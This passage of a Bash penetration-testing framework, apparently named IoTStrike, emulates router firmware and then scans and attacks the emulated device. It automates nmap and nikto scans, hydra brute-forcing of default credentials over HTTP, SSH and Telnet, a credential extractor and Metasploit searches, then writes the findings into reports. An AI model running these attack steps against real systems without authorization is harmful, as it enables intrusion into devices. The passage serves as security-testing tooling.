        echo -e "    ${B}Credentials:${RST} admin/password · admin/admin · root/(blank)"
        echo -e "    ${C}To access QEMU console: Menu [1] → [4] Attach to console${RST}"
        echo -e "  ══════════════════════════════════════════════════════"
        echo ""
        # Auto-run quick nmap + credential extractor when firmware is live
        if $FOUND; then
            nmap -sV -T4 --open -p22,23,80,443,8080,8443,22222 192.168.0.100 \
                -oN "$SCAN_LOG" >/dev/null 2>&1 \
                && echo -e "  ${G}[✔] Quick nmap complete — use [2] Scan & Attack for full results${RST}" || true
            export TARGET_IP="192.168.0.100"
            _save_session 2>/dev/null || true
            # Automatically attempt credential extraction now that target is live
            _extract_credentials "192.168.0.100"
        fi
    ) &
    local POLL_PID=$!

    echo ""
    echo -e "  ══════════════════════════════════════════════════════"
    echo -e "  ${B}Launching QEMU in detached session — menu stays live${RST}"
    echo -e "  ══════════════════════════════════════════════════════"
    echo ""

    # ── Launch QEMU fully detached — session always named 'iotstrike_qemu' ──
    # Kill any previous session with this name so the new one never conflicts
    screen -S iotstrike_qemu -X quit  2>/dev/null || true
    tmux kill-session -t iotstrike_qemu 2>/dev/null || true

    if command -v screen &>/dev/null; then
        screen -dm -S iotstrike_qemu bash -c "bash '$RUN_SCRIPT' >> '$RUN_LOG' 2>&1"
        QEMU_SESSION="iotstrike_qemu"; QEMU_TOOL="screen"
        ok "QEMU running in detached screen session: ${B}iotstrike_qemu${RST}"
        echo -e "  ${C}Attach: Menu [1] → [4]  |  Detach once inside: Ctrl-A D${RST}"
    elif command -v tmux &>/dev/null; then
        tmux new-session -d -s iotstrike_qemu \
            "bash '$RUN_SCRIPT' >> '$RUN_LOG' 2>&1"
        QEMU_SESSION="iotstrike_qemu"; QEMU_TOOL="tmux"
        ok "QEMU running in detached tmux session: ${B}iotstrike_qemu${RST}"
        echo -e "  ${C}Attach: Menu [1] → [4]  |  Detach once inside: Ctrl-B D${RST}"
    else
        nohup bash "$RUN_SCRIPT" >> "$RUN_LOG" 2>&1 &
        local _NOHUP_PID=$!
        QEMU_SESSION="nohup_${_NOHUP_PID}"; QEMU_TOOL="nohup"
        _track_job "$_NOHUP_PID" "QEMU Emulation — nohup (no interactive attach)"
        ok "QEMU running via nohup (PID ${_NOHUP_PID})"
        echo -e "  ${C}Log: tail -f $RUN_LOG${RST}"
    fi

    # Keep the live-detection poller running; register it for the BG JOBS panel
    _track_job "$POLL_PID" "Live-detection poller → 192.168.0.100 (ACE fires on contact)"
    _save_session
    echo ""
}

_qemu_attach() {
    if [[ -z "${QEMU_SESSION:-}" || "${QEMU_SESSION:-none}" == "none" ]]; then
        warn "No active QEMU session. Start emulation from option [1] first."
        IFS= read -r -e -p "  Press Enter to continue..."
        return
    fi
    echo ""
    sep
    echo -e "  ${B}Attaching to QEMU console: ${GRN}${QEMU_SESSION}${RST}"
    case "${QEMU_TOOL:-}" in
        screen)
            echo -e "  ${Y}To detach and return to IoTStrike:  Ctrl-A  then  D${RST}"
            sep; sleep 1
            screen -r iotstrike_qemu 2>/dev/null \
                || warn "Session 'iotstrike_qemu' not found — emulation may have ended."
            ;;
        tmux)
            echo -e "  ${Y}To detach and return to IoTStrike:  Ctrl-B  then  D${RST}"
            sep; sleep 1
            tmux attach-session -t iotstrike_qemu 2>/dev/null \
                || warn "Session 'iotstrike_qemu' not found — emulation may have ended."
            ;;
        *)
            warn "QEMU was launched via nohup — no interactive console available."
            local _latest_log; _latest_log=$(ls -t "$BASE_DIR/logs/run_"*.log 2>/dev/null | head -1)
            [[ -n "$_latest_log" ]] && echo -e "  ${C}Live log: tail -f $_latest_log${RST}"
            IFS= read -r -e -p "  Press Enter to continue..."
            ;;
    esac
}

_run_firmae() {
    echo ""
    if ! command -v docker &>/dev/null; then
        warn "Docker not installed. FirmAE requires Docker."
        echo -e "    ${Y}Install: curl -fsSL https://get.docker.com | sh && systemctl enable docker --now${RST}"
        echo ""
        IFS= read -r -e -p "  Press Enter to continue..."
        return
    fi
    local FIRMAE_DIR="/opt/iotstrike/firmae"
    if [[ ! -d "$FIRMAE_DIR" ]]; then
        info "FirmAE not found. Cloning now..."
        git clone --recursive https://github.com/pr0v3rbs/FirmAE "$FIRMAE_DIR" 2>&1 | tail -3 || {
            fail "Failed to clone FirmAE — check internet connection"
            IFS= read -r -e -p "  Press Enter to continue..."; return
        }
        ok "FirmAE cloned to $FIRMAE_DIR"
    fi
    _firmware_select || return
    EMULATOR="firmae"
    local TIMESTAMP; TIMESTAMP=$(date +%Y%m%d_%H%M%S)
    SESSION_NAME="${VENDOR}_firmae_${TIMESTAMP}"
    TARGET_IP="192.168.0.100"
    _save_session
    info "Running FirmAE on: $FW_PATH  (vendor: $VENDOR)"
    echo -e "  ${Y}Analysis running in Docker — this may take several minutes...${RST}"
    echo ""
    # cd into FirmAE dir so firmae.config and helper scripts resolve correctly
    pushd "$FIRMAE_DIR" > /dev/null
    bash ./run.sh -a "$VENDOR" "$FW_PATH" 2>&1
    popd > /dev/null
    echo ""
    ok "FirmAE analysis complete. Target set to 192.168.0.100"
    IFS= read -r -e -p "  Press Enter to continue..."
}

_run_emba() {
    echo ""
    if [[ ! -d /opt/emba ]]; then
        warn "EMBA not installed (static analysis framework)."
        echo ""
        IFS= read -r -e -p "  Install EMBA now? [y/N]: " inst
        if [[ "${inst,,}" == "y" ]]; then
            info "Cloning EMBA from GitHub..."
            git clone https://github.com/e-m-b-a/emba /opt/emba 2>&1 | tail -3 || {
                fail "Failed to clone EMBA — check internet connection"
                IFS= read -r -e -p "  Press Enter to continue..."; return
            }
            ok "EMBA cloned to /opt/emba"
        else
            echo -e "    ${Y}Manual install: git clone https://github.com/e-m-b-a/emba /opt/emba${RST}"
            IFS= read -r -e -p "  Press Enter to continue..."; return
        fi
    fi
    _firmware_select || return
    info "Running EMBA static analysis on: $FW_PATH"
    local emba_log="$BASE_DIR/logs/emba_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$emba_log"
    # Support both emba.sh (older) and emba (newer binary name)
    local emba_bin="/opt/emba/emba.sh"
    [[ ! -f "$emba_bin" ]] && emba_bin="/opt/emba/emba"
    if [[ ! -f "$emba_bin" ]]; then
        fail "EMBA executable not found in /opt/emba"
        IFS= read -r -e -p "  Press Enter to continue..."; return
    fi
    bash "$emba_bin" -f "$FW_PATH" -l "$emba_log" -s 2>&1 | tail -40
    ok "EMBA analysis log saved to: $emba_log"
    echo ""
    IFS= read -r -e -p "  Press Enter to continue..."
}

# =============================================================================
# MODULE 2 — Scan & Attack
# =============================================================================
_scan_menu() {
    hdr "Scan & Attack"
    echo ""
    if [[ "$TARGET_IP" == "none" || -z "$TARGET_IP" ]]; then
        warn "No active target. Emulate a firmware first (Option 1)."
        echo ""
        IFS= read -r -e -p "  Or enter target IP/hostname (or 'b' to go back): " MANUAL_IP
        [[ -z "$MANUAL_IP" || "$MANUAL_IP" =~ ^[bB]$ ]] && return
        # Basic validation — reject obviously invalid entries
        if [[ ! "$MANUAL_IP" =~ ^[0-9a-zA-Z._:-]+$ ]]; then
            warn "Invalid target: $MANUAL_IP"; return
        fi
        TARGET_IP="$MANUAL_IP"; _save_session
    fi
    echo -e "  ${B}Target:${RST} ${G}$TARGET_IP${RST}   ${B}Vendor:${RST} $VENDOR"
    echo ""
    echo -e "    ${B}[1]${RST} Quick scan          ${C}(top IoT ports: 22,23,80,443,8080)${RST}"
    echo -e "    ${B}[2]${RST} Full service scan   ${C}(all ports, version detection)${RST}"
    echo -e "    ${B}[3]${RST} Web vulnerability   ${C}(nikto)${RST}"
    echo -e "    ${B}[4]${RST} Default credentials ${C}(hydra — HTTP + SSH + Telnet)${RST}"
    echo -e "    ${B}[5]${RST} Metasploit search   ${C}(search modules for $VENDOR)${RST}"
    echo -e "    ${B}[6]${RST} ${G}Full pipeline${RST}       ${C}(run 1→2→3→4 automatically)${RST}"
    echo -e "    ${B}[b]${RST} Back"
    echo ""
    IFS= read -r -e -p "  Select [1-6/b]: " sc
    case "$sc" in
        1) _nmap_quick ;;
        2) _nmap_full ;;
        3) _nikto_scan ;;
        4) _hydra_scan ;;
        5) _msf_search ;;
        6) _nmap_quick; _nmap_full; _nikto_scan; _hydra_scan ;;
        b|B) return ;;
        *) warn "Invalid"; _scan_menu ;;
    esac
    echo ""; IFS= read -r -e -p "  Press Enter to continue..."; _scan_menu
}

_nmap_quick() {
    info "Quick nmap scan on $TARGET_IP..."
    SCAN_LOG="$BASE_DIR/logs/nmap_quick_${TARGET_IP}_$(date +%Y%m%d_%H%M%S).txt"
    set +o pipefail
    nmap -sV -T4 --open \
        -p 21,22,23,25,53,80,161,443,554,8080,8443,9000,22222 \
        "$TARGET_IP" -oN "$SCAN_LOG" 2>&1 \
        | grep -E "open|STATE|Nmap scan report|PORT" || true
    set -o pipefail
    _save_session
    ok "Results saved to $SCAN_LOG"
}

_nmap_full() {
    info "Full service scan on $TARGET_IP (may take a few minutes)..."
    local LOG="$BASE_DIR/logs/nmap_full_${TARGET_IP}_$(date +%Y%m%d_%H%M%S).txt"
    set +o pipefail
    nmap -sV -A -T4 --open "$TARGET_IP" -oN "$LOG" 2>&1 \
        | grep -E "open|filtered|Nmap|OS:|Service" || true
    set -o pipefail
    SCAN_LOG="$LOG"
    _save_session
    ok "Full scan results: $LOG"
}

_nikto_scan() {
    if ! command -v nikto &>/dev/null; then
        warn "nikto not installed. Install: sudo apt-get install nikto"; return
    fi
    info "Web vulnerability scan on http://$TARGET_IP..."
    local LOG="$BASE_DIR/logs/nikto_${TARGET_IP}_$(date +%Y%m%d_%H%M%S).txt"
    nikto -h "http://$TARGET_IP" -output "$LOG" 2>&1 | grep -E "^\+|OSVDB|Server:|ERROR"
    ok "Nikto results: $LOG"
}

_hydra_scan() {
    if ! command -v hydra &>/dev/null; then
        warn "hydra not installed. Install: sudo apt-get install hydra"; return
    fi
    info "Testing default credentials on $TARGET_IP..."
    local USERS="$BASE_DIR/wordlists/users.txt"
    local PWDS="$BASE_DIR/wordlists/passwords.txt"
    local LOG="$BASE_DIR/logs/hydra_${TARGET_IP}_$(date +%Y%m%d_%H%M%S).txt"
    echo ""
    info "Testing HTTP..."
    hydra -L "$USERS" -P "$PWDS" -t 4 -f "$TARGET_IP" \
        http-get / -o "${LOG}_http.txt" 2>&1 | grep -E "login:|valid|ERROR" || true
    if nc -z -w2 "$TARGET_IP" 22 2>/dev/null; then
        info "Testing SSH..."
        hydra -L "$USERS" -P "$PWDS" -t 4 -f "$TARGET_IP" \
            ssh -o "${LOG}_ssh.txt" 2>&1 | grep -E "login:|valid|ERROR" || true
    fi
    if nc -z -w2 "$TARGET_IP" 23 2>/dev/null; then
        info "Testing Telnet..."
        hydra -L "$USERS" -P "$PWDS" -t 4 -f "$TARGET_IP" \
            telnet -o "${LOG}_telnet.txt" 2>&1 | grep -E "login:|valid|ERROR" || true
    fi
    ok "Credential test complete — results: ${LOG}*"
}

_msf_search() {
    if ! command -v msfconsole &>/dev/null; then
        warn "Metasploit not installed. Install: sudo apt-get install metasploit-framework"; return
    fi
    local msf_term="$VENDOR"
    if [[ "$msf_term" == "unknown" || -z "$msf_term" ]]; then
        IFS= read -r -e -p "  Vendor/product unknown — enter search term (e.g. netgear, dlink): " msf_term
        [[ -z "$msf_term" ]] && return
    fi
    info "Searching Metasploit modules for: ${B}$msf_term${RST}..."
    echo ""
    set +o pipefail
    msfconsole -q -x "search ${msf_term}; exit" 2>/dev/null \
        | grep -v "^$\|Metasploit\|msf\|\[\*\] exec\|Copyright\|Free" \
        | grep -E "exploit|auxiliary|post|\/" \
        | head -40 || true
    set -o pipefail
    echo ""
    [[ "$TARGET_IP" != "none" && -n "$TARGET_IP" ]] && \
        info "To use a module: msfconsole → use <module> → set RHOSTS $TARGET_IP → run"
}

# =============================================================================
# MODULE 3 — CVE Intelligence
# =============================================================================
_cve_menu() {
    hdr "CVE Intelligence"
    echo ""
    local search_vendor="${VENDOR:-unknown}"
    if [[ "$search_vendor" == "unknown" ]]; then
        IFS= read -r -e -p "  Enter vendor to search (e.g. netgear, dlink, tplink): " search_vendor
        [[ -z "$search_vendor" || "$search_vendor" =~ ^[bB]$ ]] && return
    fi
    local version=""
    IFS= read -r -e -p "  Firmware version (optional, press Enter to skip): " version

    echo ""
    echo -e "    ${B}[1]${RST} Search by vendor: ${G}$search_vendor${RST}"
    echo -e "    ${B}[2]${RST} Search vendor + version"
    echo -e "    ${B}[3]${RST} Show only CRITICAL (CVSS ≥ 9)"
    echo -e "    ${B}[4]${RST} Show only HIGH (CVSS ≥ 7)"
    echo -e "    ${B}[5]${RST} Export CVE report to file"
    echo -e "    ${B}[b]${RST} Back"
    echo ""
    IFS= read -r -e -p "  Select [1-5/b]: " cvc
    case "$cvc" in
        1) _cve_lookup "$search_vendor" "" "" ;;
        2) _cve_lookup "$search_vendor" "$version" "" ;;
        3) _cve_lookup "$search_vendor" "$version" "CRITICAL" ;;
        4) _cve_lookup "$search_vendor" "$version" "HIGH" ;;
        5) _cve_export "$search_vendor" ;;
        b|B) return ;;
        *) warn "Invalid"; _cve_menu ;;
    esac
    echo ""; IFS= read -r -e -p "  Press Enter to continue..."; _cve_menu
}

_cve_lookup() {
    local vendor="$1" version="$2" severity="$3"
    # Normalise common vendor shortnames to NVD-indexed names
    local nvd_vendor="$vendor"
    case "${vendor,,}" in
        tplink|tp_link)       nvd_vendor="tp-link" ;;
        dlink|d_link)         nvd_vendor="d-link" ;;
        ubiquiti|unifi)       nvd_vendor="ubiquiti" ;;
        mikrotik)             nvd_vendor="mikrotik" ;;
        zyxel)                nvd_vendor="zyxel" ;;
        draytek)              nvd_vendor="draytek" ;;
    esac
    local query="${nvd_vendor}"
    [[ -n "$version" ]] && query="${nvd_vendor} ${version}"
    # URL-encode spaces for the query string
    local enc_query="${query// /+}"
    local url="https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${enc_query}&resultsPerPage=20"
    [[ -n "$severity" ]] && url="${url}&cvssV3Severity=${severity}"
    local log="$BASE_DIR/logs/cve_${vendor}_latest.json"

    info "Querying NVD API for: ${B}${nvd_vendor}${RST} ${version:+v$version} ${severity:+(${severity} only)}..."
    if ! curl -s --max-time 30 \
        -H "Accept: application/json" \
        "$url" -o "$log" 2>/dev/null; then
        fail "CVE lookup failed — check internet connection"; return 1
    fi
    # Check for rate-limit or error response
    if python3 -c "import json,sys; d=json.load(open(sys.argv[1])); sys.exit(0 if 'vulnerabilities' in d or 'totalResults' in d else 1)" \
        "$log" 2>/dev/null; then : ; else
        warn "NVD API returned unexpected response — may be rate-limited (max 5 req/30s without API key)"
        python3 -c "import json,sys; print(open(sys.argv[1]).read()[:300])" "$log" 2>/dev/null || true
        return 1
    fi
    echo ""
    python3 - "$log" << 'PYEOF'
import json, sys
try:
    data = json.load(open(sys.argv[1]))
except Exception as e:
    print("  [!] Could not parse response:", e); sys.exit(1)
vulns = data.get("vulnerabilities", [])
if not vulns:
    print("  No CVEs found for this query."); sys.exit(0)
print("  Found " + str(len(vulns)) + " CVE(s):\n")
print("  " + "-"*70)
for v in vulns:
    c = v["cve"]
    cid = c["id"]
    m = c.get("metrics", {})
    score = "N/A"; sev = ""
    if "cvssMetricV31" in m:
        cd = m["cvssMetricV31"][0]["cvssData"]
        score = str(cd["baseScore"]); sev = cd.get("baseSeverity", "")
    elif "cvssMetricV30" in m:
        cd = m["cvssMetricV30"][0]["cvssData"]
        score = str(cd["baseScore"]); sev = cd.get("baseSeverity", "")
    elif "cvssMetricV2" in m:
        cd = m["cvssMetricV2"][0]["cvssData"]
        score = str(cd["baseScore"]); sev = cd.get("baseSeverity", "V2")
    desc = c["descriptions"][0]["value"][:100]
    try: sv = float(score)
    except (ValueError, TypeError): sv = 0.0
    bar = "\033[0;31m" if sv >= 9 else ("\033[0;33m" if sv >= 7 else "\033[0;32m")
    rst = "\033[0m"
    print("  " + bar + cid + rst + "  CVSS:" + bar + score + rst + " [" + sev + "]")
    print("  " + desc + ("..." if len(c["descriptions"][0]["value"]) > 100 else ""))
    refs = c.get("references", [])
    if refs: print("  Ref: " + refs[0]["url"])
    print("  " + "-"*70)
PYEOF
    _save_session
}

_cve_export() {
    local vendor="$1"
    local log="$BASE_DIR/logs/cve_${vendor}_latest.json"
    local report="$BASE_DIR/reports/cve_${vendor}_$(date +%Y%m%d_%H%M%S).txt"
    [[ ! -f "$log" ]] && { warn "No CVE data for $vendor. Run search first."; return; }
    python3 - "$log" "$report" << 'PYEOF'
import json, sys, datetime
data = json.load(open(sys.argv[1]))
vulns = data.get("vulnerabilities", [])
with open(sys.argv[2], "w") as out:
    out.write("CVE Report — " + str(datetime.datetime.now()) + "\n")
    out.write("=" * 70 + "\n\n")
    for v in vulns:
        c = v["cve"]
        m = c.get("metrics", {})
        score = "N/A"
        if "cvssMetricV31" in m:
            score = str(m["cvssMetricV31"][0]["cvssData"]["baseScore"])
        elif "cvssMetricV30" in m:
            score = str(m["cvssMetricV30"][0]["cvssData"]["baseScore"])
        elif "cvssMetricV2" in m:
            score = str(m["cvssMetricV2"][0]["cvssData"]["baseScore"])
        out.write(c["id"] + "  CVSS:" + score + "\n")
        out.write(c["descriptions"][0]["value"] + "\n")
        for r in c.get("references", [])[:2]:
            out.write("  " + r["url"] + "\n")
        out.write("-" * 70 + "\n")
print("  CVE report exported.")
PYEOF
    ok "Exported to $report"
}

# =============================================================================
# MODULE 4 — Session Manager
# =============================================================================
_session_menu() {
    hdr "Session Manager"
    echo ""
    echo -e "    ${B}[1]${RST} Save current session"
    echo -e "    ${B}[2]${RST} List saved sessions"
    echo -e "    ${B}[3]${RST} Load a session"
    echo -e "    ${B}[4]${RST} Delete a session"
    echo -e "    ${B}[5]${RST} Compare two sessions"
    echo -e "    ${B}[b]${RST} Back"
    echo ""
    IFS= read -r -e -p "  Select [1-5/b]: " sm
    case "$sm" in
        1) _session_save ;;
        2) _session_list ;;
        3) _session_load ;;
        4) _session_delete ;;
        5) _session_compare ;;
        b|B) return ;;
        *) warn "Invalid"; _session_menu ;;
    esac
    echo ""; IFS= read -r -e -p "  Press Enter to continue..."; _session_menu
}

_session_save() {
    mkdir -p "$BASE_DIR/sessions"
    IFS= read -r -e -p "  Session name (or Enter for auto): " name
    local ts; ts=$(date +%Y%m%d_%H%M%S)
    SESSION_NAME="${name:-${VENDOR}_${ts}}"
    _save_session   # flush current state to SESSION_FILE first
    local sf="$BASE_DIR/sessions/${SESSION_NAME}.env"
    cp "$SESSION_FILE" "$sf"
    ok "Session saved: $sf"
}

_session_list() {
    echo ""
    echo -e "  ${B}Saved sessions:${RST}"
    local n=1 found=0
    for f in "$BASE_DIR/sessions/"*.env; do
        [[ -f "$f" ]] || continue
        found=1
        local sname; sname=$(basename "$f" .env)
        local sip; sip=$(grep "TARGET_IP" "$f" 2>/dev/null | cut -d'"' -f2 || echo "?")
        local sv;  sv=$(grep  "VENDOR"    "$f" 2>/dev/null | cut -d'"' -f2 || echo "?")
        printf "    ${B}[%d]${RST} %-30s  IP:%-16s  Vendor:%s\n" "$n" "$sname" "$sip" "$sv"
        ((n++))
    done
    [[ $found -eq 0 ]] && echo "  No sessions saved yet."
}

_session_load() {
    _session_list
    echo ""
    mapfile -t FILES < <(find "$BASE_DIR/sessions/" -name "*.env" -type f 2>/dev/null | sort)
    [[ ${#FILES[@]} -eq 0 ]] && { warn "No sessions to load."; return; }
    IFS= read -r -e -p "  Enter session number to load: " idx
    [[ "$idx" =~ ^[0-9]+$ ]] && (( idx >= 1 && idx <= ${#FILES[@]} )) || { warn "Invalid"; return; }
    local sf="${FILES[$((idx-1))]}"
    # Parse safely — never source the file
    SESSION_NAME="$(_session_read_key  SESSION_NAME  "$sf" none)"
    FW_PATH="$(_session_read_key       FW_PATH       "$sf" none)"
    VENDOR="$(_session_read_key        VENDOR        "$sf" unknown)"
    TARGET_IP="$(_session_read_key     TARGET_IP     "$sf" none)"
    FW_ARCH="$(_session_read_key       FW_ARCH       "$sf" unknown)"
    EMULATOR="$(_session_read_key      EMULATOR      "$sf" none)"
    SCAN_LOG="$(_session_read_key      SCAN_LOG      "$sf" none)"
    QEMU_SESSION="$(_session_read_key  QEMU_SESSION  "$sf" none)"
    QEMU_TOOL="$(_session_read_key     QEMU_TOOL     "$sf" none)"
    cp "$sf" "$SESSION_FILE"
    ok "Session loaded: ${SESSION_NAME}"
    _status_bar
}

_session_delete() {
    _session_list
    echo ""
    mapfile -t FILES < <(find "$BASE_DIR/sessions/" -name "*.env" -type f 2>/dev/null | sort)
    [[ ${#FILES[@]} -eq 0 ]] && { warn "No sessions to delete."; return; }
    IFS= read -r -e -p "  Enter session number to delete: " idx
    [[ "$idx" =~ ^[0-9]+$ ]] && (( idx >= 1 && idx <= ${#FILES[@]} )) || { warn "Invalid"; return; }
    rm -f "${FILES[$((idx-1))]}"
    ok "Deleted: $(basename "${FILES[$((idx-1))]}")"
}

_session_compare() {
    _session_list
    echo ""
    mapfile -t FILES < <(find "$BASE_DIR/sessions/" -name "*.env" -type f 2>/dev/null | sort)
    [[ ${#FILES[@]} -lt 2 ]] && { warn "Need at least 2 sessions to compare."; return; }
    IFS= read -r -e -p "  First session number: " a
    IFS= read -r -e -p "  Second session number: " b
    if ! [[ "$a" =~ ^[0-9]+$ ]] || (( a < 1 || a > ${#FILES[@]} )); then
        warn "Invalid first session number: $a"; return; fi
    if ! [[ "$b" =~ ^[0-9]+$ ]] || (( b < 1 || b > ${#FILES[@]} )); then
        warn "Invalid second session number: $b"; return; fi
    echo ""
    echo -e "  ${B}Comparison:${RST}"
    echo -e "  ${C}$(printf '%-20s %-30s %-30s' 'Field' "Session $a" "Session $b")${RST}"
    sep
    for key in SESSION_NAME TARGET_IP VENDOR FW_ARCH EMULATOR; do
        local v1; v1=$(grep "$key" "${FILES[$((a-1))]}" 2>/dev/null | cut -d'"' -f2 || echo "—")
        local v2; v2=$(grep "$key" "${FILES[$((b-1))]}" 2>/dev/null | cut -d'"' -f2 || echo "—")
        printf "  %-20s %-30s %-30s\n" "$key" "$v1" "$v2"
    done
}

# =============================================================================
# MODULE 5 — Web Dashboard
# =============================================================================
_web_menu() {
    hdr "Web Dashboard"
    echo ""
    local WEB_PID_FILE="$BASE_DIR/.web_pid"
    if [[ -f "$WEB_PID_FILE" ]] && kill -0 "$(cat "$WEB_PID_FILE")" 2>/dev/null; then
        ok "Dashboard is ${G}RUNNING${RST} at ${B}http://localhost:8080${RST}"
        echo ""
        echo -e "    ${B}[1]${RST} Open in browser (xdg-open)"
        echo -e "    ${B}[2]${RST} Stop dashboard"
        echo -e "    ${B}[b]${RST} Back"
        IFS= read -r -e -p "  Select: " wc
        case "$wc" in
            1) xdg-open http://localhost:8080 2>/dev/null || \
               echo -e "  Open manually: ${C}http://localhost:8080${RST}" ;;
            2) kill "$(cat "$WEB_PID_FILE")" 2>/dev/null; rm -f "$WEB_PID_FILE"
               ok "Dashboard stopped" ;;
            b|B) return ;;
        esac
    else
        info "Starting web dashboard on port 8080..."
        _save_session 2>/dev/null || true
        python3 -m http.server 8080 --directory "$BASE_DIR/web" >/dev/null 2>&1 &
        echo $! > "$WEB_PID_FILE"
        sleep 1
        ok "Dashboard started: ${B}http://localhost:8080${RST}"
        echo ""
        echo -e "  ${C}Dashboard auto-refreshes every 5 seconds${RST}"
        echo -e "  ${C}Shows: target IP, vendor, open ports, CVEs, scan log${RST}"
        xdg-open http://localhost:8080 2>/dev/null || true
    fi
    echo ""; IFS= read -r -e -p "  Press Enter to continue..."
}

# =============================================================================
# MODULE 6 — Report Generator
# =============================================================================
_report_menu() {
    hdr "Report Generator"
    echo ""
    echo -e "    ${B}[1]${RST} Generate Markdown report"
    echo -e "    ${B}[2]${RST} Generate HTML report"
    echo -e "    ${B}[3]${RST} List existing reports"
    echo -e "    ${B}[b]${RST} Back"
    echo ""
    IFS= read -r -e -p "  Select [1-3/b]: " rc
    case "$rc" in
        1) _gen_report "md" ;;
        2) _gen_report "html" ;;
        3) ls -lh "$BASE_DIR/reports/" 2>/dev/null | head -20 ;;
        b|B) return ;;
        *) warn "Invalid"; _report_menu ;;
    esac
    echo ""; IFS= read -r -e -p "  Press Enter to continue..."; _report_menu
}

_gen_report() {
    local fmt="$1"
    local ts; ts=$(date +%Y%m%d_%H%M%S)
    local out="$BASE_DIR/reports/IoTStrike_${VENDOR}_${ts}.${fmt}"
    local nmap_data="No nmap scan data"
    local nikto_data="No nikto scan data"
    local cve_data="No CVE data"

    # Prefer the session's SCAN_LOG; fall back to the most-recent nmap log in logs/
    local _nmap_file="$SCAN_LOG"
    if [[ "$_nmap_file" == "none" || ! -f "$_nmap_file" ]]; then
        _nmap_file=$(ls -t "$BASE_DIR/logs/nmap_"*.txt 2>/dev/null | head -1 || echo "")
    fi
    [[ -n "$_nmap_file" && -f "$_nmap_file" ]] && nmap_data=$(head -40 "$_nmap_file")

    # Most-recent nikto log for this target (or any, as fallback)
    local _nikto_file
    _nikto_file=$(ls -t "$BASE_DIR/logs/nikto_${TARGET_IP}"*.txt 2>/dev/null | head -1 \
                  || ls -t "$BASE_DIR/logs/nikto_"*.txt 2>/dev/null | head -1 || echo "")
    [[ -n "$_nikto_file" && -f "$_nikto_file" ]] && nikto_data=$(head -30 "$_nikto_file")
    local cve_log="$BASE_DIR/logs/cve_${VENDOR}_latest.json"
    if [[ -f "$cve_log" ]]; then
        local PYSC3; PYSC3=$(mktemp /tmp/cve_report_XXXXXX.py)
        cat > "$PYSC3" << 'REPORTPY'
import json, sys
try:
    data = json.load(open(sys.argv[1]))
    vulns = data.get('vulnerabilities', [])
    for v in vulns[:10]:
        c = v['cve']
        m = c.get('metrics', {})
        score = 'N/A'
        if 'cvssMetricV31' in m:
            score = str(m['cvssMetricV31'][0]['cvssData']['baseScore'])
        elif 'cvssMetricV30' in m:
            score = str(m['cvssMetricV30'][0]['cvssData']['baseScore'])
        elif 'cvssMetricV2' in m:
            score = str(m['cvssMetricV2'][0]['cvssData']['baseScore'])
        print(c['id'] + ' CVSS:' + score + ' ' + c['descriptions'][0]['value'][:80])
except Exception:
    print('CVE parse error')
REPORTPY
        cve_data=$(python3 "$PYSC3" "$cve_log" 2>/dev/null || echo "CVE parse error")
        rm -f "$PYSC3"
    fi

    if [[ "$fmt" == "md" ]]; then
        cat > "$out" << REPORTEOF
# IoTStrike Security Assessment Report

**Date:** $(date)
**Analyst:** IoTStrike Framework
**Session:** ${SESSION_NAME}

---

## Target Information

| Field | Value |
|---|---|
| IP Address | ${TARGET_IP} |
| Vendor | ${VENDOR} |
| Architecture | ${FW_ARCH} |
| Emulator | ${EMULATOR} |
| Firmware | ${FW_PATH} |

---

## Open Ports & Services (nmap)

\`\`\`
${nmap_data}
\`\`\`

---

## Web Vulnerabilities (nikto)

\`\`\`
${nikto_data}
\`\`\`

---

## CVE Findings (NVD)

\`\`\`
${cve_data}
\`\`\`

---

## Recommendations

1. Change all default credentials immediately
2. Apply firmware updates for any identified CVEs
3. Disable unused services (telnet, HTTP if HTTPS available)
4. Implement network segmentation for IoT devices
5. Monitor for exploit attempts targeting identified CVEs

---
*Generated by IoTStrike — Yechiel Said | https://github.com/CyberSentinel-sys*
*Contact: yechielstudy@gmail.com | Issues: https://github.com/CyberSentinel-sys/iotstrike/issues*
REPORTEOF
    else
        cat > "$out" << HTMLEOF
<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>IoTStrike Report — ${VENDOR}</title>
<style>body{font-family:sans-serif;max-width:900px;margin:40px auto;background:#f5f5f5;color:#333}
h1{color:#cc2200}h2{color:#333;border-bottom:2px solid #cc2200;padding-bottom:4px}
table{width:100%;border-collapse:collapse;margin:16px 0}
td,th{padding:8px;border:1px solid #ddd;text-align:left}th{background:#cc2200;color:#fff}
pre{background:#1a1a1a;color:#e0e0e0;padding:16px;border-radius:4px;overflow-x:auto;font-size:.85em}
.badge{display:inline-block;padding:2px 8px;border-radius:3px;font-size:.8em}
.red{background:#ffdddd;color:#cc2200}.green{background:#ddffdd;color:#006600}</style></head>
<body><h1>⚡ IoTStrike Security Assessment</h1>
<p><strong>Date:</strong> $(date) | <strong>Session:</strong> ${SESSION_NAME}</p>
<h2>Target Information</h2>
<table><tr><th>Field</th><th>Value</th></tr>
<tr><td>IP Address</td><td>${TARGET_IP}</td></tr>
<tr><td>Vendor</td><td>${VENDOR}</td></tr>
<tr><td>Architecture</td><td>${FW_ARCH}</td></tr>
<tr><td>Emulator</td><td>${EMULATOR}</td></tr>
<tr><td>Firmware Path</td><td>${FW_PATH}</td></tr></table>
<h2>Open Ports &amp; Services</h2><pre>${nmap_data}</pre>
<h2>Web Vulnerabilities (Nikto)</h2><pre>${nikto_data}</pre>
<h2>CVE Findings</h2><pre>${cve_data}</pre>
<h2>Recommendations</h2><ul>
<li>Change all default credentials</li>
<li>Apply firmware updates for identified CVEs</li>
<li>Disable unused services (Telnet, plain HTTP)</li>
<li>Implement network segmentation for IoT devices</li>
<li>Monitor exploit attempts for identified CVEs</li></ul>
<footer style="margin-top:40px;color:#999;font-size:.8em">
Generated by IoTStrike — Yechiel Said | https://github.com/CyberSentinel-sys | yechielstudy@gmail.com</footer>
</body></html>
HTMLEOF
    fi

    ok "Report generated: ${B}$out${RST}"
    [[ "$fmt" == "html" ]] && { xdg-open "$out" 2>/dev/null || true; }
}

# =============================================================================
# MAIN MENU — Live Dashboard numbered menu
# =============================================================================

# Ask user to pick firmware on startup and kick off background pre-processing
_startup_preflight() {
    echo ""
    echo -e "  ${B}${C}Firmware Pre-Processing${RST}"
    echo -e "  ${C}Select firmware now — background jobs (CVE lookup, EMBA) start immediately.${RST}"
    echo ""

    local DIRS=("$HOME/Desktop" "$HOME/Downloads" "$HOME" "/tmp" "$(pwd)" "$BASE_DIR/uploads")
